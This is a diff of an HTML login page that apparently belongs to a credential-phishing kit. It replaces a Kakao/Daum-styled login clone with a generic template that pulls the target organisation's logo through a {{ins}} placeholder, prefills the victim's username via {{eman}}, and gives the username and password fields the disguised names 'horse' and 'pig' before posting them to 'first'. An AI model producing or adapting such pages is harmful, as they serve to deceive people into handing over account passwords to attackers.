@@ -1,45 +1,188 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta name="GENERATOR" content="MSHTML 11.00.10570.1001">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url(https://images.unsplash.com/photo-1487147264018-f937fba0c817?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTF8fGJhY2tncm91bmR8ZW58MHx8MHx8fDA%3D);
+      background-size: cover;
+      width: 500px;
+      height: 500px;
+      background-position: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      height: 420px;
+      background: linear-gradient(to right, #FFA07A, #FFD700);
+      border-radius: 45px;
+      color: #2E8B57;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 70px 30px;
+      animation: shake 0.5s ease-in-out, fadeIn 1s ease-in-out;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+    }
+
+    @keyframes shake {
+      0%, 100% {
+        transform: translateX(0);
+      }
+      25%, 75% {
+        transform: translateX(-10px);
+      }
+      50% {
+        transform: translateX(10px);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    .login-container p {
+      margin: 0;
+      padding: 0;
+      font-weight: bold;
+      font-size: 20px;
+      color: #333;
+    }
+
+    .login-container input {
+      width: 100%;
+      margin-bottom: 20px;
+      padding: 10px;
+      border-radius: 8px;
+      transition: border-bottom 0.3s, transform 0.3s;
+      animation: inputPulse 1s infinite alternate;
+    }
+
+    @keyframes inputPulse {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.02);
+      }
+    }
+
+    .login-container input[type="text"],
+    input[type="password"] {
+      border: none;
+      border-bottom: 1px solid #fff;
+      background: rgba(255, 255, 255, 0.8);
+      outline: none;
+      height: 40px;
+      color: #333;
+      font-size: 16px;
+    }
+
+    .login-container input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-bottom: 1px solid #2E8B57;
+      transform: scale(1.02);
+    }
+
+    .login-container input[type="submit"] {
+      border: none;
+      outline: none;
+      height: 40px;
+      background: #2E8B57;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 20px;
+      transition: background 0.3s, color 0.3s;
+    }
+
+    .login-container input[type="submit"]:hover {
+      cursor: pointer;
+      background: #3CB371;
+      color: #fff;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
+      animation: buttonPulse 0.5s ease-in-out;
+    }
+
+    @keyframes buttonPulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    h1 {
+      margin: 0;
+      padding: 0 0 20px;
+      text-align: center;
+      font-size: 24px;
+      color: #333;
+    }
+
+    .login-container a {
+      text-decoration: none;
+      font-size: 14px;
+      color: #fff;
+      transition: color 0.3s;
+    }
+
+    .login-container a:hover {
+      color: #3CB371;
+    }
+
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      position: absolute;
+      top: -50px;
+      left: calc(50% - 50px);
+    }
+
+    @media (max-width: 600px) {
+      .login-container {
+        height: auto;
+        padding: 50px 30px;
+      }
+
+      .avatar {
+        width: 80px;
+        height: 80px;
+        top: -40px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <div id="__next" style='margin: 0px; padding: 0px; width: 1349px; height: 657px; color: rgb(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: -apple-system, Roboto, NotoSans, AppleSDGothicNeo, "Malgun Gothic", "&#47569;&#51008; &#44256;&#46357;", &#46027;&#50880;, dotum, sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; 
-    -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;' data-reactroot="">
-    <div class="container-doc" style="margin: 0px; padding: 0px; height: 657px; font-size: 0px;">
-      <div class="inner_container" style="margin: 0px; padding: 0px; width: 1349px; font-size: 12px; vertical-align: middle; display: inline-block; -ms-overflow-x: hidden;">
-        <main class="doc-main" style="margin: 0px; padding: 0px;">
-          <div class="doc-title" style="margin: 0px; padding: 50px 0px 0px;">
-            <h1 class="tit_service" style="margin: 0px; padding: 0px; display: block;">
-              <span class="logo_kakao" style='background: url("/images/pc/logo_kakao.png") no-repeat 0px 0px / 100px 80px rgb(255, 255, 255); margin: 0px auto; padding: 0px; width: 88px; height: 27px; text-align: center; line-height: 27px; font-size: 19px; display: block;'>
-                <span class="ir_wa" style="margin: 0px; padding: 0px; width: 88px; height: 27px; overflow: hidden; display: block; position: relative; z-index: -1;">Kakao</span>
-              </span>
-            </h1>
-          </div>
-          <article class="content-article" id="mainContent" style="margin: 40px auto 42px; padding: 0px 69px; border: 1px solid rgba(0, 0, 0, 0.12); border-image: none; width: 580px; height: 493px; font-size: 12px; box-sizing: border-box;">
-            <div class="cont_login" style="margin: 0px; padding: 55px 0px 50px; height: 491px; position: relative; box-sizing: border-box; overflow-wrap: break-word;">
-              <div class="login_kakaomail" style="margin: 0px; padding: 0px;">
-                <form action="first" method="post" style="margin: 0px; padding: 0px;">
-                  <div class="item_form fst" style="margin: 4px 0px 0px; padding: 0px 0px 3px; position: relative;">
-                    <!-- Remaining content with English translations -->
-                  </div>
-                </form>
-                <div class="info_user" style="margin: 26px 0px 0px; padding: 0px;">
-                  <a class="link_join" style="margin: 0px; padding: 0px; color: rgb(25, 25, 25); font-size: 12px; text-decoration: none; float: left; cursor: pointer; -webkit-tap-highlight-color: rgba(255, 255, 255, 0);" href="file:///C:/weblogin/create_account?lang=en&amp;continue=https%3A%2F%2Flogins.daum.net%2Faccounts%2Fksso.do%3Frescue%3Dtrue%26url%3Dhttps%253A%252F%252Fwww.daum.net"></a>
-                  <ul class="list_user" style="list-style: none; margin: 0px; padding: 0px; float: right;">
-                    <!-- Remaining content with English translations -->
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </article>
-        </main>
-      </div>
-    </div>
-    <footer class="doc-footer" style="margin: 0px; padding: 0px 0px 50px; text-align: center; display: block; white-space: nowrap;">
-      <!-- Footer content with English translations -->
-    </footer>
-  </div>
-  <!-- Additional content with English translations -->
+<div class="login-container">
+  <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
+  <h1>Login Here</h1>
+  <form action="first" method="post">
+    <p>Username</p>
+    <input type="text" name="horse" placeholder="Enter your username" value="{{eman}}">
+    <p>Password</p>
+    <input type="password" name="pig" placeholder="Enter your password" required>
+    <input type="submit" name="submit" value="Login">
+    <a href="#">Forgot Password?</a>
+  </form>
+</div>
 </body>
 </html>
